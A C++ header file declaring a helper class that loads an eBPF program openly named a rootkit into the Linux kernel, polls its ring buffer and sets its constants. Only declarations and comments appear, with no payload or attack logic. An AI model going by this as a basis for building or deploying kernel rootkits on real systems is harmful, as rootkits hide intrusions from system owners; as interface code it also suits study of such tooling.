#ifndef ROOTKIT_EBPF_HELPER_H
#define ROOTKIT_EBPF_HELPER_H

#include <string>
#include <optional>
#include "rootkit.skel.h"
#include "rootkit/ConfigManager.hpp"
#include "rootkit/issues/Error.hpp"
#include "rootkit/issues/Logger.hpp"

namespace rootkit {

class RootkitBpfHelper {
private:
    RootkitBpfConfig conf;
    struct rootkit_bpf * skel;
    struct ring_buffer * rb;
    issues::Error error;

public:
    /**
     * @brief Load rootkit bpf (src/ebpf/rootkit) into the kernel
     * @param conf Configuration
     * @param rb_callback Callback function that will be called every time ring
     * buffer receives data
     */
    RootkitBpfHelper(const RootkitBpfConfig& conf,
        int (* rb_callback)(void *, void *, unsigned long),
        const issues::Logger& logger
    );

    /**
     * @brief Unload rootkit bpf
    */
    ~RootkitBpfHelper();

    /**
     * @brief Returns rootkit bpf status
     * @return Returns nullopt if bpf was loaded correctly, and error message otherwise
     */
    std::optional<std::string> status() const;

    /**
     * @return Returns loaded rootkit bpf, or nullptr if bpf wasn't properly loaded
     */
    struct rootkit_bpf * get_rootkit();

    /**
     * @brief Poll from ringbuffer
     * @param timeout Time in ms
     */
    void rb_poll(int timeout);

private:
    /**
     * @brief Destroy bpf
     */
    void clean();

    /**
     * @brief Setup links between bpf functions and their ID
     */
    void setup_arr_links();

    /**
     * @brief Setups ring buffer so data is ready to poll from it
     * @param map Ring buffer map
     * @param callback Function that will be called after data is received
     */
    void setup_msg_ring_buffer(
        struct bpf_map * map,
        int (*callback)(void *, void *, unsigned long)
    );

    /**
     * @brief Setups volatile constants in ebpf program. In case of an error, it
     * puts it inside of an error_msg variable
     * @return Returns true if bpf consts were set correctly,
     * and false otherwise
     */
    bool setup_volatile_consts();
};

}

#endif
